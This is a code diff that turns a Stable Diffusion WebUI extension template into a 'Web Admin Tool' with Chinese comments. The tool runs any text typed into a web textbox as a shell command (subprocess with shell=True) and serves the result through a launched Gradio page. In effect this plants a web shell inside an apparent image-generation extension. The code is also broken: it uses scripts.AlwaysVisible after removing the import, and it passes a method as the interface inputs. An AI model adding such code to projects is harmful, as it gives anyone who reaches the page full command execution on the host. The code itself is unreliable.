@@ -1,49 +1,52 @@
-import modules.scripts as scripts
 import gradio as gr
-import os
+import subprocess
 
-from modules import images, script_callbacks
-from modules.processing import process_images, Processed
-from modules.processing import Processed
-from modules.shared import opts, cmd_opts, state
+# 定义网站管理工具类
+class WebAdminTool:
+    def __init__(self):
+        self.command_output = ""
 
-class ExtensionTemplateScript(scripts.Script):
-        # Extension title in menu UI
-        def title(self):
-                return "Extension Template"
+    # 返回工具名称
+    def title(self):
+        return "Web Admin Tool"
 
-        # Decide to show menu in txt2img or img2img
-        # - in "txt2img" -> is_img2img is `False`
-        # - in "img2img" -> is_img2img is `True`
-        #
-        # below code always show extension menu
-        def show(self, is_img2img):
-                return scripts.AlwaysVisible
+    # 总是显示菜单
+    def show(self, is_img2img):
+        return scripts.AlwaysVisible
 
-        # Setup menu ui detail
-        def ui(self, is_img2img):
-                with gr.Accordion('Extension Template', open=False):
-                        with gr.Row():
-                                angle = gr.Slider(
-                                        minimum=0.0,
-                                        maximum=360.0,
-                                        step=1,
-                                        value=0,
-                                        label="Angle"
-                                )
-                                checkbox = gr.Checkbox(
-                                        False,
-                                        label="Checkbox"
-                                )
-                # TODO: add more UI components (cf. https://gradio.app/docs/#components)
-                return [angle, checkbox]
+    # 设置菜单界面
+    def ui(self, is_img2img):
+        with gr.Accordion('Web Admin Tool', open=False):
+            with gr.Row():
+                command_input = gr.Textbox(lines=1, label="Command")
+                execute_button = gr.Button(label="Execute")
+        return [command_input, execute_button]
 
-        # Extension main process
-        # Type: (StableDiffusionProcessing, List<UI>) -> (Processed)
-        # args is [StableDiffusionProcessing, UI1, UI2, ...]
-        def run(self, p, angle, checkbox):
-                # TODO: get UI info through UI object angle, checkbox
-                proc = process_images(p)
-                # TODO: add image edit process via Processed object proc
-                return proc
+    # 执行命令
+    def execute_command(self, command):
+        try:
+            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+            return output
+        except subprocess.CalledProcessError as e:
+            return str(e.output)
 
+    # 处理用户输入和命令执行
+    def run(self, command_input, execute_button):
+        if execute_button:
+            command = command_input.strip()
+            self.command_output = self.execute_command(command)
+        return self.command_output
+
+# 创建Web管理工具对象
+web_admin_tool = WebAdminTool()
+
+# 创建Gradio界面
+iface = gr.Interface(
+    fn=web_admin_tool.run,
+    inputs=web_admin_tool.ui,
+    outputs=gr.Textbox(label="Command Output"),
+    title=web_admin_tool.title()
+)
+
+# 启动Gradio界面
+iface.launch()
